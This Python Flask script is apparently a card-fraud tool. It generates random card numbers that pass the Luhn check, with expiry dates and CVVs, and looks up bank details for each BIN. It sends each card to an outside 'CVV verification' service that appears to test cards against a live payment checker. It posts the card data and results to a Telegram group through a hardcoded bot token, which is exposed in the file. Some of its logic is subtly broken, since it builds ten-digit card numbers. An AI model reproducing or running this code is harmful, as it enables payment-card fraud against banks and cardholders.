import requests
import random
import json
from flask import Flask, jsonify
import os

# Telegram bot token and chat ID
BOT_TOKEN = "7195510626:AAE4KKwNyYPM8Q0NSdTrn6gzEvZqrvz-DuQ"
CHAT_ID = "-1002181591571"  # Ensure this is in the correct format for groups

# External API URL for CVV verification
CVV_API_URL = "https://ugin-376ec3a40d16.herokuapp.com/cvv"

app = Flask(__name__)

def generate_bin():
    prefix = random.choice(['3', '4', '5', '34', '6', '8'])  # '4' for Visa, '5' for MasterCard
    bin_number = prefix + ''.join([str(random.randint(0, 9)) for _ in range(9)])  # 9 more digits
    return bin_number

def luhn_algorithm(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def generate_valid_card(bin_number):
    while True:
        card_number = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(10 - len(bin_number))])
        if luhn_algorithm(card_number):
            return card_number

def generate_expiry_date():
    month = str(random.randint(1, 12)).zfill(2)  # Ensure month is two digits
    year = str(random.randint(24, 30))  # Generate a year between 2024 and 2030
    return month, year

def generate_cvv(card_brand):
    if card_brand.lower() == 'amex':
        return str(random.randint(1000, 9999))  # Generate a 4-digit CVV for Amex
    return str(random.randint(100, 999))  # Generate a 3-digit CVV for other cards

def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number[:6]}"  # First 6 digits
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching BIN info: {e}")
        return {"error": "Failed to retrieve BIN information"}

def format_bin_message(bin_number, bin_info, card_number, expiry_date, cvv, cvv_verification_details):
    label = "CREDIT BIN" if bin_info.get('type') == "CREDIT" else "DEBIT/PREPAID BIN"
    
    verification_message = (
        f"🔴 Error Message: `{cvv_verification_details.get('message', 'N/A')}`\n"
        f"🛠 Decline Code: `{cvv_verification_details.get('decline_code', 'N/A')}`\n"
        f"🔗 More Info: [Documentation]({cvv_verification_details.get('doc_url', 'N/A')})"
        if cvv_verification_details else "⚠️ No specific error details available."
    )

    return (
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 BIN Generated: `{bin_number}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Brand: `{bin_info.get('brand', 'N/A')}`\n"
        f"🏦 Type: {bin_info.get('type', 'N/A')} ({label})\n"
        f"⚡ Level: `{bin_info.get('level', 'N/A')}`\n"
        f"🏢 Bank: `{bin_info.get('bank', 'N/A')} 🏛️`\n"
        f"🌍 Country: `{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Card Number: `{card_number}`\n"
        f"📅 Expiry Date: `{expiry_date[0]}/{expiry_date[1]}`\n"
        f"🔒 CVV: `{cvv}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔐 CVV Verification:\n"
        f"{verification_message}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        response_data = response.json()
        if not response_data.get("ok"):
            print(f"Telegram API error: {response_data.get('description')}")
        else:
            print("Message sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        payload = {
            "chat_id": CHAT_ID
        }
        files = {
            "document": file
        }
        try:
            response = requests.post(url, data=payload, files=files)
            response.raise_for_status()
            response_data = response.json()
            if not response_data.get("ok"):
                print(f"Telegram API error: {response_data.get('description')}")
            else:
                print("File sent successfully.")
        except requests.exceptions.RequestException as e:
            print(f"Error sending file to Telegram: {e}")

def verify_cvv(card_number, expiry_date, cvv):
    params = {
        'cc': f"{card_number}|{expiry_date[0]}|{expiry_date[1]}|{cvv}"
    }
    try:
        response = requests.get(CVV_API_URL, params=params)
        response.raise_for_status()
        response_data = response.json()

        # Check for error information in the response
        if "error" in response_data:
            return {
                "message": response_data['error'].get('message'),
                "decline_code": response_data['error'].get('decline_code'),
                "doc_url": response_data['error'].get('doc_url')
            }

        # If error details are not present, return None to indicate a need to send raw response
        return None

    except requests.exceptions.RequestException as e:
        print(f"Error verifying CVV: {e}")
        return None

@app.route('/bin', methods=['GET'])
def bin_endpoint():
    bin_number = generate_bin()
    bin_info = get_bin_info(bin_number)
    
    if "error" in bin_info:
        return jsonify({"error": "Failed to retrieve BIN information"}), 500

    card_number = generate_valid_card(bin_number)
    expiry_date = generate_expiry_date()
    card_brand = bin_info.get('brand', 'N/A')
    cvv = generate_cvv(card_brand)

    cvv_verification_details = verify_cvv(card_number, expiry_date, cvv)
    
    if cvv_verification_details:
        # Prepare and send the message to Telegram
        message = format_bin_message(bin_number, bin_info, card_number, expiry_date, cvv, cvv_verification_details)
        send_message_to_telegram(message)
    else:
        # Send the raw API response as a .txt file if specific error details are unavailable
        raw_response_path = 'raw_cvv_response.txt'
        with open(raw_response_path, 'w') as file:
            file.write(json.dumps(cvv_verification_details, indent=4))

        send_file_to_telegram(raw_response_path)
        os.remove(raw_response_path)  # Clean up the file after sending

    # Return the BIN and card information as a JSON response
    return jsonify({
        "bin_number": bin_number,
        "card_number": card_number,
        "expiry_date": f"{expiry_date[0]}/{expiry_date[1]}",
        "cvv": cvv,
        "brand": card_brand,
        "type": bin_info.get('type', 'N/A'),
        "level": bin_info.get('level', 'N/A'),
        "bank": bin_info.get('bank', 'N/A'),
        "country_name": bin_info.get('country_name', 'N/A'),
        "country_flag": bin_info.get('country_flag', ''),
        "cvv_verification": cvv_verification_details
    })

@app.route('/keep_alive', methods=['GET'])
def keep_alive():
    return "Script is running."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  
